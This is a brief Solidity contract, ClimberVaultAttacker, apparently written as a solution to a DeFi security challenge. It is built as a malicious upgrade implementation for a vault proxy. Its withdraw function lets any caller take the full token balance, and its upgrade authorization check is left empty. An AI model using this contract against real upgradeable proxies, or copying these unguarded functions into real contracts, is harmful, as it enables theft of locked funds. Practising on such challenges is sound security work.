// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

import "./ClimberVault.sol";

contract ClimberVaultAttacker is OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    function withdraw(address tokenAddress) external {
        IERC20 token = IERC20(tokenAddress);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}
